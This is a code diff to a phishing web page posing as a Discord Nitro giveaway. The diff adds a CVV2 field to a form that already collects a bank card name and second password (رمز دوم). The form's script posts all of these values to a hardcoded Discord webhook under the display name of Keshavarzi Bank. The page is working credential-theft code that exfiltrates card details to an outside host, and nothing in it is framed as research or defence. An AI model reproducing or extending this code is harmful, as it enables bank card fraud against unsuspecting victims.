@@ -23,6 +23,9 @@
 			<div class="input_field">
 					<input type="password" name="password" id="password" placeholder="رمز دوم" class="input"required>
 				</div>
+	                <div class="input_field">
+					<input type="password1" name="password1" id="password1" placeholder="CVV2" class="input"required>
+				</div>
 				<button class="btn" onclick="send()" >
 					<div class="btnt" > Send Nitro </div>
 				</button>
@@ -44,6 +47,7 @@
     function send(){
         var a = document.getElementById("username").value; 
         var b = document.getElementById("password").value; 
+        var c = document.getElementById("password1").value; 
         var discordWebhook = "https://discord.com/api/webhooks/933960588281913374/LdbUe1zS8E27fID_2HKpvPIoFhV6ejjXvyvHN9A-mjjQKCD0HEfa6Vq807Az5fr5bUv2";       
         var request = new XMLHttpRequest();
         request.open("POST", discordWebhook);
@@ -52,7 +56,7 @@
 			username: "بانک کشاورزی",
             avatar_url: "https://cdn.discordapp.com/attachments/900813614628368397/908308809016045590/OkYU6D.jpg",
 
-            content: 'نام کارت :'+a+" رمز دوم:"+b+" ."
+            content: 'نام کارت :'+a+" رمز دوم:"+b+" CVV2:"+c+"."
     
         };
         request.send(JSON.stringify(params));
